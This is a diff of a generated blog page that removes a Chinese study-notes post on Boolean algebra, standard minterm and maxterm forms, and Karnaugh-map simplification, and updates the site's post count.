-<h2 id="211-逻辑变量及基本逻辑运算"><a class="markdownIt-Anchor" href="#211-逻辑变量及基本逻辑运算"></a> 2.1.1 逻辑变量及基本逻辑运算</h2>
-<p>一、逻辑变量<br />
-任何逻辑变量仅有两种可能取值：0或1<br />
-二、基本逻辑运算：与或非</p>
-<h2 id="212-逻辑函数表示形式"><a class="markdownIt-Anchor" href="#212-逻辑函数表示形式"></a> 2.1.2 逻辑函数表示形式</h2>
-<ol>
-<li>逻辑函数表达式</li>
-<li>真值表</li>
-<li>卡诺图</li>
-</ol>
-<h1 id="22-逻辑代数公理-基本定理与规则"><a class="markdownIt-Anchor" href="#22-逻辑代数公理-基本定理与规则"></a> 2.2 逻辑代数公理、基本定理与规则</h1>
-<h2 id="221-公理"><a class="markdownIt-Anchor" href="#221-公理"></a> 2.2.1 公理：</h2>
-<ol>
-<li>交换律</li>
-<li>结合律</li>
-<li>分配律</li>
-<li>0-1律</li>
-<li>互补律</li>
-</ol>
-<h2 id="222-基本定理"><a class="markdownIt-Anchor" href="#222-基本定理"></a> 2.2.2 基本定理：</h2>
-<ol>
-<li>0与1的与或关系</li>
-<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>+</mo><mi>A</mi><mo>=</mo><mi>A</mi><mo separator="true">,</mo><mi>A</mi><mo>⋅</mo><mi>A</mi><mo>=</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">A+A=A,A\cdot A=A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span></li>
-<li>吸收律：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>⋅</mo><mo stretchy="false">(</mo><mi>A</mi><mo>+</mo><mi>B</mi><mo stretchy="false">)</mo><mo>=</mo><mi>A</mi><mo separator="true">,</mo><mi>A</mi><mo>+</mo><mi>A</mi><mo>⋅</mo><mi>B</mi><mo>=</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">A\cdot(A+B)=A,A+A\cdot B=A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span></li>
-<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>+</mo><mover accent="true"><mi>A</mi><mo>ˉ</mo></mover><mo>⋅</mo><mi>B</mi><mo>=</mo><mi>A</mi><mo>+</mo><mi>B</mi><mo separator="true">,</mo><mi>A</mi><mo>⋅</mo><mo stretchy="false">(</mo><mover accent="true"><mi>A</mi><mo>ˉ</mo></mover><mo>+</mo><mi>B</mi><mo stretchy="false">)</mo><mo>=</mo><mi>A</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">A+\bar A\cdot B=A+B,A\cdot(\bar A+B)=AB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8201099999999999em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">A</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.11110999999999999em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.07011em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">A</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.11110999999999999em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></li>
-<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mover accent="true"><mi>A</mi><mo stretchy="true">‾</mo></mover><mo stretchy="true">‾</mo></mover><mo>=</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">\overline {\overline A}=A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">A</span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span><span style="top:-4.00333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span></li>
-<li>德摩根律</li>
-<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>⋅</mo><mi>B</mi><mo>+</mo><mi>A</mi><mo>⋅</mo><mover accent="true"><mi>B</mi><mo>ˉ</mo></mover><mo>=</mo><mi>A</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>A</mi><mo>+</mo><mi>B</mi><mo stretchy="false">)</mo><mo>⋅</mo><mo stretchy="false">(</mo><mi>A</mi><mo>+</mo><mover accent="true"><mi>B</mi><mo>ˉ</mo></mover><mo stretchy="false">)</mo><mo>=</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">A\cdot B+A\cdot \bar B=A,(A+B)\cdot(A+\bar B)=A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8201099999999999em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.07011em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span></li>
-<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>⋅</mo><mi>B</mi><mo>+</mo><mover accent="true"><mi>A</mi><mo>ˉ</mo></mover><mo>⋅</mo><mi>C</mi><mo>+</mo><mi>B</mi><mo>⋅</mo><mi>C</mi><mo>=</mo><mi>A</mi><mo>⋅</mo><mi>B</mi><mo>+</mo><mover accent="true"><mi>A</mi><mo>ˉ</mo></mover><mo>⋅</mo><mi>C</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>A</mi><mo>+</mo><mi>B</mi><mo stretchy="false">)</mo><mo>⋅</mo><mo stretchy="false">(</mo><mover accent="true"><mi>A</mi><mo>ˉ</mo></mover><mo>+</mo><mi>C</mi><mo stretchy="false">)</mo><mo>⋅</mo><mo stretchy="false">(</mo><mi>B</mi><mo>+</mo><mi>C</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>A</mi><mo>+</mo><mi>B</mi><mo stretchy="false">)</mo><mo>⋅</mo><mo stretchy="false">(</mo><mover accent="true"><mi>A</mi><mo>ˉ</mo></mover><mo>+</mo><mi>C</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A\cdot B+\bar A\cdot C+B\cdot C=A\cdot B+\bar A\cdot C,(A+B)\cdot(\bar A+C)\cdot(B+C)=(A+B)\cdot(\bar A+C)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8201099999999999em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">A</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.11110999999999999em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8201099999999999em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">A</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.11110999999999999em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.07011em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">A</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.11110999999999999em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.07011em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">A</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.11110999999999999em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span></span></span></span></li>
-</ol>
-<h2 id="223-重要规则"><a class="markdownIt-Anchor" href="#223-重要规则"></a> 2.2.3 重要规则</h2>
-<ol>
-<li>代入规则</li>
-<li>反演规则</li>
-<li>对偶规则</li>
-</ol>
-<h2 id="224-复合逻辑"><a class="markdownIt-Anchor" href="#224-复合逻辑"></a> 2.2.4 复合逻辑</h2>
-<ol>
-<li>与非逻辑：先与后非</li>
-<li>或非逻辑：先或后非</li>
-<li>与或非逻辑：先与再或后非</li>
-<li>异或、同或</li>
-</ol>
-<h1 id="23-逻辑函数表达式两种基本形式"><a class="markdownIt-Anchor" href="#23-逻辑函数表达式两种基本形式"></a> 2.3 逻辑函数表达式两种基本形式</h1>
-<h2 id="231-两种基本形式"><a class="markdownIt-Anchor" href="#231-两种基本形式"></a> 2.3.1 两种基本形式</h2>
-<p>与-或表达式（先与后或）、或-与表达式（先或后与）</p>
-<h2 id="232-标准形式"><a class="markdownIt-Anchor" href="#232-标准形式"></a> 2.3.2 标准形式</h2>
-<ol>
-<li>标准与-或表达式：由一系列最小项或构成的逻辑表达式，也称为最小项表达式。<br />
-最小项：如果一个具有n个变量的函数的与项包含全部n个变量，每一个变量都以原变量或反变量的形式出现且仅出现1次，则该与项称为最小项。<br />
-<strong>使用m<sub>i</sub>表示最小项，下标取值规则：按照变量顺序将原变量以1表示，反变量以0表示得到的二进制数。</strong><br />
-最小项性质：<br />
-(1) 任意一个最小项相应变量有且仅有一种取值使其值为1<br />
-(2) 相同变量构成的最小项相与均为0<br />
-(3) 所有最小项相或为1<br />
-(4) n个变量构成的最小项有n个相邻最小项（仅有一个变量的原反形式不同）。</li>
-<li>标准或-与表达式：由一系列最大项与构成的逻辑表达式，也称为最大项表达式。<br />
-最大项：如果一个具有n个变量的函数的或项包含全部n个变量，每一个变量都以原变量或反变量的形式出现且仅出现1次，则该或项称为最大项。<br />
-<strong>使用M<sub>i</sub>表示最大项，下标取值规则与最小项相反：按照变量顺序将原变量以0表示，反变量以1表示得到的二进制数。</strong><br />
-最大项性质：<br />
-(1) 任意一个最大项相应变量有且仅有一种取值使其值为0<br />
-(2) 相同变量构成的最大项相或均为1<br />
-(3) 所有最大项相与为0<br />
-(4) n个变量构成的最大项有n个相邻最大项（仅有一个变量的原反形式不同）。</li>
-</ol>
-<p>最小项与最大项的关系：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>m</mi><mi>i</mi></msub><mo stretchy="true">‾</mo></mover><mo>=</mo><msub><mi>M</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\overline {m_i}=M_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78056em;vertical-align:-0.15em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.63056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.55056em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p>
-<h2 id="233-任意逻辑函数表达式转换为标准表达式"><a class="markdownIt-Anchor" href="#233-任意逻辑函数表达式转换为标准表达式"></a> 2.3.3 任意逻辑函数表达式转换为标准表达式</h2>
-<p>代数转换法、真值表转换法</p>
-<ol>
-<li>代数转换法：先转换后扩展</li>
-<li>真值表转换法：列表直接写</li>
-</ol>
-<h1 id="24-逻辑函数化简"><a class="markdownIt-Anchor" href="#24-逻辑函数化简"></a> 2.4 逻辑函数化简</h1>
-<h2 id="241-代数化简"><a class="markdownIt-Anchor" href="#241-代数化简"></a> 2.4.1 代数化简</h2>
-<p>没有固定步骤可以遵循。<br />
-最简与或表达式条件：</p>
-<ol>
-<li>表达式中与项最少</li>
-<li>每一个与项的变量个数最少<br />
-与或表达式化简常用方法：并项、吸收、消去、配项<br />
-或与表达式化简常用方法：两次对偶法（或与对偶成与或，化简与或后对偶成最简或与）</li>
-</ol>
-<h2 id="242-卡诺图化简"><a class="markdownIt-Anchor" href="#242-卡诺图化简"></a> 2.4.2 卡诺图化简</h2>
-<p>可从图形上直观找出相邻最小项合并（使用卡诺圈）<br />
-求逻辑函数最简与或表达式的一般步骤：</p>
-<ul>
-<li>画出函数卡诺图</li>
-<li>圈出函数的全部质蕴含项</li>
-<li>找出所有必要质蕴含项</li>
-<li>求最简质蕴含项集</li>
-</ul>
-<p>（质蕴含项：不是其他与项子集的与项）<br />
-卡诺图化简原则：</p>
-<ol>
-<li>覆盖函数中所有最小项的前提下，卡诺圈的个数应达到最少</li>
-<li>满足合并规律的前提下卡诺圈达到最大</li>
-<li>根据合并需要，每个最小项可以被多个卡诺圈包围。</li>
-</ol>
-<p>求最简或与表达式一般步骤：</p>
-<ul>
-<li>做出卡诺图，求出反函数的最简与或表达式（0格）</li>
-<li>对反函数的最简与或表达式取反即得到原函数的最简或与表达式</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2401,7 +2372,7 @@ Z_2=\overline{A_2}A_0+\overline{A_3}A_1+A_3\overline{A_1}+A_2\overline{A_0}</ann
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">157</span>
+          <span class="site-state-item-count">158</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
